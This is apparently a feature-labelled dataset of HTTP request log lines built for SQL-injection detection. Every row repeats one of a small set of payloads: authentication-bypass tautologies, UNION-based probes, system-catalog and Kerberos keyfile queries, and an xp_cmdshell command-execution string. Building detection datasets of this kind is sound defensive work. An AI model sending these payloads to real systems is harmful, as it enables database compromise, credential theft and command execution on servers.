57,1,200,6460,7,36,5,2,1,GET login/?id=select grantee from syscat.dbauth; HTTP/1.1
57,1,200,5716,7,36,5,2,1,GET login/?id=select grantee from syscat.dbauth; HTTP/1.1
57,1,200,1606,7,36,5,2,1,GET login/?id=select grantee from syscat.dbauth; HTTP/1.1
57,1,200,7465,7,36,5,2,1,GET login/?id=select grantee from syscat.dbauth; HTTP/1.1
57,1,200,1422,7,36,5,2,1,GET login/?id=select grantee from syscat.dbauth; HTTP/1.1
57,1,200,4443,7,36,5,2,1,GET login/?id=select grantee from syscat.dbauth; HTTP/1.1
57,1,200,6803,7,36,5,2,1,GET login/?id=select grantee from syscat.dbauth; HTTP/1.1
46,1,200,2984,7,25,6,1,1,GET ?id=select * from syscat.tabauth; HTTP/1.1
46,1,200,4282,7,25,6,1,1,GET ?id=select * from syscat.tabauth; HTTP/1.1
46,1,200,2396,7,25,6,1,1,GET ?id=select * from syscat.tabauth; HTTP/1.1
46,1,200,5897,7,25,6,1,1,GET ?id=select * from syscat.tabauth; HTTP/1.1
46,1,200,5453,7,25,6,1,1,GET ?id=select * from syscat.tabauth; HTTP/1.1
46,1,200,2282,7,25,6,1,1,GET ?id=select * from syscat.tabauth; HTTP/1.1
46,1,200,1773,7,25,6,1,1,GET ?id=select * from syscat.tabauth; HTTP/1.1
46,1,200,1768,7,25,6,1,1,GET ?id=select * from syscat.tabauth; HTTP/1.1
46,1,200,1596,7,25,6,1,1,GET ?id=select * from syscat.tabauth; HTTP/1.1
46,1,200,1886,7,25,6,1,1,GET ?id=select * from syscat.tabauth; HTTP/1.1
27,1,200,2528,7,4,7,1,1,GET ?id=' or 1=1-- HTTP/1.1
27,1,200,6675,7,4,7,1,1,GET ?id=' or 1=1-- HTTP/1.1
27,1,200,3623,7,4,7,1,1,GET ?id=' or 1=1-- HTTP/1.1
27,1,200,2917,7,4,7,1,1,GET ?id=' or 1=1-- HTTP/1.1
25,1,200,6733,7,4,6,1,1,GET ?id='or'1=1¡¬ HTTP/1.1
25,1,200,7990,7,4,6,1,1,GET ?id='or'1=1¡¬ HTTP/1.1
25,1,200,5759,7,4,6,1,1,GET ?id='or'1=1¡¬ HTTP/1.1
49,1,200,1443,7,28,6,2,1,GET login/?id=select current_database(); HTTP/1.1
49,1,200,6975,7,28,6,2,1,GET login/?id=select current_database(); HTTP/1.1
49,1,200,6979,7,28,6,2,1,GET login/?id=select current_database(); HTTP/1.1
49,1,200,4836,7,28,6,2,1,GET login/?id=select current_database(); HTTP/1.1
49,1,200,3892,7,28,6,2,1,GET login/?id=select current_database(); HTTP/1.1
49,1,200,1675,7,28,6,2,1,GET login/?id=select current_database(); HTTP/1.1
49,1,200,6600,7,28,6,2,1,GET login/?id=select current_database(); HTTP/1.1
49,1,200,7542,7,28,6,2,1,GET login/?id=select current_database(); HTTP/1.1
49,1,200,7880,7,28,6,2,1,GET login/?id=select current_database(); HTTP/1.1
49,1,200,2349,7,28,6,2,1,GET login/?id=select current_database(); HTTP/1.1
49,1,200,2833,7,28,6,2,1,GET login/?id=select current_database(); HTTP/1.1
62,1,200,3082,7,38,8,1,1,GET ?id=select current_setting('krb_server_keyfile'); HTTP/1.1
62,1,200,4288,7,38,8,1,1,GET ?id=select current_setting('krb_server_keyfile'); HTTP/1.1
62,1,200,4714,7,38,8,1,1,GET ?id=select current_setting('krb_server_keyfile'); HTTP/1.1
62,1,200,5998,7,38,8,1,1,GET ?id=select current_setting('krb_server_keyfile'); HTTP/1.1
62,1,200,5216,7,38,8,1,1,GET ?id=select current_setting('krb_server_keyfile'); HTTP/1.1
39,1,200,4459,7,20,5,2,0,GET login/?id=select @@version HTTP/1.1
39,1,200,2113,7,20,5,2,0,GET login/?id=select @@version HTTP/1.1
39,1,200,7827,7,20,5,2,0,GET login/?id=select @@version HTTP/1.1
39,1,200,7711,7,20,5,2,0,GET login/?id=select @@version HTTP/1.1
39,1,200,7939,7,20,5,2,0,GET login/?id=select @@version HTTP/1.1
39,1,200,5881,7,20,5,2,0,GET login/?id=select @@version HTTP/1.1
39,1,200,4874,7,20,5,2,0,GET login/?id=select @@version HTTP/1.1
39,1,200,4679,7,20,5,2,0,GET login/?id=select @@version HTTP/1.1
64,1,200,6754,7,38,7,3,2,GET login/?id=exec master..xp_cmdshell 'ipconfig /all'	 HTTP/1.1
64,1,200,1424,7,38,7,3,2,GET login/?id=exec master..xp_cmdshell 'ipconfig /all'	 HTTP/1.1
64,1,200,1612,7,38,7,3,2,GET login/?id=exec master..xp_cmdshell 'ipconfig /all'	 HTTP/1.1
64,1,200,1296,7,38,7,3,2,GET login/?id=exec master..xp_cmdshell 'ipconfig /all'	 HTTP/1.1
64,1,200,7301,7,38,7,3,2,GET login/?id=exec master..xp_cmdshell 'ipconfig /all'	 HTTP/1.1
64,1,200,3227,7,38,7,3,2,GET login/?id=exec master..xp_cmdshell 'ipconfig /all'	 HTTP/1.1
56,1,200,6811,21,14,8,2,1,GET login/?id=' UNION ALL SELECT 1_ @@version;# HTTP/1.1
56,1,200,6995,21,14,8,2,1,GET login/?id=' UNION ALL SELECT 1_ @@version;# HTTP/1.1
56,1,200,4118,21,14,8,2,1,GET login/?id=' UNION ALL SELECT 1_ @@version;# HTTP/1.1
34,1,200,2669,7,11,8,2,1,GET login/?id=' or 'x'='x HTTP/1.1
34,1,200,4801,7,11,8,2,1,GET login/?id=' or 'x'='x HTTP/1.1
34,1,200,6971,7,11,8,2,1,GET login/?id=' or 'x'='x HTTP/1.1
34,1,200,4381,7,11,8,2,1,GET login/?id=' or 'x'='x HTTP/1.1
34,1,200,4486,7,11,8,2,1,GET login/?id=' or 'x'='x HTTP/1.1
34,1,200,7667,7,11,8,2,1,GET login/?id=' or 'x'='x HTTP/1.1
29,1,200,7894,7,4,9,1,1,GET ?id=%' or '0'='0 HTTP/1.1
29,1,200,1807,7,4,9,1,1,GET ?id=%' or '0'='0 HTTP/1.1
29,1,200,5284,7,4,9,1,1,GET ?id=%' or '0'='0 HTTP/1.1
30,1,200,5537,7,9,4,2,0,GET login/?id= or 1=1 HTTP/1.1
30,1,200,7088,7,9,4,2,0,GET login/?id= or 1=1 HTTP/1.1
30,1,200,1415,7,9,4,2,0,GET login/?id= or 1=1 HTTP/1.1
30,1,200,6541,7,9,4,2,0,GET login/?id= or 1=1 HTTP/1.1
41,1,200,6295,7,9,6,2,1,GET login/?id=' or         0=0 # HTTP/1.1
41,1,200,2547,7,9,6,2,1,GET login/?id=' or         0=0 # HTTP/1.1
41,1,200,6354,7,9,6,2,1,GET login/?id=' or         0=0 # HTTP/1.1
41,1,200,7766,7,9,6,2,1,GET login/?id=' or         0=0 # HTTP/1.1
81,1,200,4596,24,15,8,1,1,GET ?id=' AND 1=0 UNION ALL SELECT ''_ '81dc9bdb52d04dc20036dbd8313ed055 HTTP/1.1
81,1,200,6523,24,15,8,1,1,GET ?id=' AND 1=0 UNION ALL SELECT ''_ '81dc9bdb52d04dc20036dbd8313ed055 HTTP/1.1
81,1,200,7881,24,15,8,1,1,GET ?id=' AND 1=0 UNION ALL SELECT ''_ '81dc9bdb52d04dc20036dbd8313ed055 HTTP/1.1
81,1,200,5426,24,15,8,1,1,GET ?id=' AND 1=0 UNION ALL SELECT ''_ '81dc9bdb52d04dc20036dbd8313ed055 HTTP/1.1
56,1,200,7128,7,34,6,2,1,GET login/?id=select * from master..sysserverse HTTP/1.1
56,1,200,7315,7,34,6,2,1,GET login/?id=select * from master..sysserverse HTTP/1.1
56,1,200,3328,7,34,6,2,1,GET login/?id=select * from master..sysserverse HTTP/1.1
56,1,200,5678,7,34,6,2,1,GET login/?id=select * from master..sysserverse HTTP/1.1
56,1,200,2869,7,34,6,2,1,GET login/?id=select * from master..sysserverse HTTP/1.1
56,1,200,4230,7,34,6,2,1,GET login/?id=select * from master..sysserverse HTTP/1.1
56,1,200,6852,7,34,6,2,1,GET login/?id=select * from master..sysserverse HTTP/1.1
31,1,200,1626,7,9,5,2,0,GET login/?id= or 1=1# HTTP/1.1
31,1,200,2624,7,9,5,2,0,GET login/?id= or 1=1# HTTP/1.1
31,1,200,7546,7,9,5,2,0,GET login/?id= or 1=1# HTTP/1.1
